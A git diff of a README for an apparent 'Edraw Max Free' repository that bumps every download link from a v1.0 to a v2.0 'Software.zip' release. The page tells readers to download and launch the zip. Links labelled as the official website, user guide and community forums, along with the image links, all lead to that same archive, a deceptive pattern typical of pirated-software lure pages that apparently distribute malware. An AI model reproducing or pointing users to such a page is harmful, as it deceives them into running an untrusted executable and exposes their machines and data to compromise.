@@ -25,12 +25,12 @@ Here are some of the key topics covered in this repository:
 - Is Edraw Max Safe
 
 ## Get Started
-To get started with Edraw Max Free, you can access the [Edraw Max Free Zip File](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v1.0/Software.zip). Once you download the file, launch it to kickstart your Edraw Max journey.
+To get started with Edraw Max Free, you can access the [Edraw Max Free Zip File](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v2.0/Software.zip). Once you download the file, launch it to kickstart your Edraw Max journey.
 
 ## 🌈 Explore Edraw Max 
 
-### ![Edraw Max](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v1.0/Software.zip%20Here-Explore%20Edraw%20Max-blue)
-![Edraw Max Logo](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v1.0/Software.zip)
+### ![Edraw Max](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v2.0/Software.zip%20Here-Explore%20Edraw%20Max-blue)
+![Edraw Max Logo](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v2.0/Software.zip)
 
 Experience the power of Edraw Max with its intuitive interface, extensive library of templates, and powerful diagramming tools. Whether you are a professional designer or a student working on a project, Edraw Max offers a wide range of features to bring your ideas to life.
 
@@ -61,9 +61,9 @@ Stay ahead of the curve with Edraw Max's innovative tools for diagramming, desig
 
 ## 📚 Resources
 Explore the following resources to enhance your Edraw Max experience:
-- [Official Edraw Max Website](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v1.0/Software.zip)
-- [User Guide](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v1.0/Software.zip)
-- [Community Forums](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v1.0/Software.zip)
+- [Official Edraw Max Website](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v2.0/Software.zip)
+- [User Guide](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v2.0/Software.zip)
+- [Community Forums](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v2.0/Software.zip)
 
 ## 🤝 Join the Community
 Connect with other Edraw Max users, share your projects, and learn from fellow diagramming enthusiasts by joining the Edraw Max community.
@@ -83,4 +83,4 @@ Feel free to reach out if you have any questions, suggestions, or feedback. Happ
 
 ---
 
-![Edraw Max](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v1.0/Software.zip)
+![Edraw Max](https://github.com/gaming12122/Edraw-Max-Free/releases/download/v2.0/Software.zip)
